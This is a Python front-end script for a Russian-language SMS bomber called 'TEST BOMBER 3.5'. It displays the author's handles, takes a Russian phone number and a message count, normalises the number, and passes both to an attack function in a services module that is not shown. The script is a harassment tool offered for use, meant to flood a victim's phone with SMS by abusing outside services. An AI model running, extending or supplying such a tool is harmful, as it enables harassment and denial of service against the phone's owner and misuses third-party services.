import requests
import services

# colours
green     = '\033[92m'
cyan      = '\033[95m'
bold      = '\033[1m'
underline = '\033[4m'
end       = '\033[0m'
red       = '\033[91m'

# header
print(f"{green}{bold}\t\t{underline}TEST BOMBER 3.5{end}")

print()
print(f"{bold}Разработчик{end}", end="")
print(f"{green}{bold} >> {end}", end="")
print(f"{cyan}{bold}chikada3301{end}")

print(f"{bold}Telegram{end}", end="")
print(f"{green}{bold} >> {end}", end="")
print(f"{cyan}{bold}@chikada3301{end}")

print(f"{bold}vk{end}", end="")
print(f"{green}{bold} >> {end}", end="")
print(f"{cyan}{bold}@chikada3301{end}")
print()

print(f"{bold}По просьбе{end}", end="")
print(f"{green}{bold} >> {end}", end="")
print(f"{red}{bold}@idite_naxxyi_sykki{end}")
print()

# inputs
print('Введите номер телефона (+7,8)\nПример: 9951231861')
input_number = input(green + bold + ">> " + end)
print('Сколько sms отправить?')
sms = int(input(green + bold + ">> " + end))

def parse_number(number):
	msg = f"Проверка номера - {green}{bold}Успешно{end}"
	if len(number) in (10, 11, 12):
		if number[0] == "8":
			number = number[1:]
			print(msg)
		elif number[:2] == "+7":
			number = number[2:]
			print(msg)
		elif int(len(number)) == 10 and number[0] == 9:
			print(msg)
	else:
		print(f"Проверка номера - {red}{bold}Неправильно набран номер{end}\nBomber предназначен только для номеров РФ.\nПожалуйста, проверьте правильно ли набран номер.\nВ ближайшее время обновления для других стран не ожидается.")
		quit()
	return number
number = parse_number(input_number)

services.attack(number, sms)
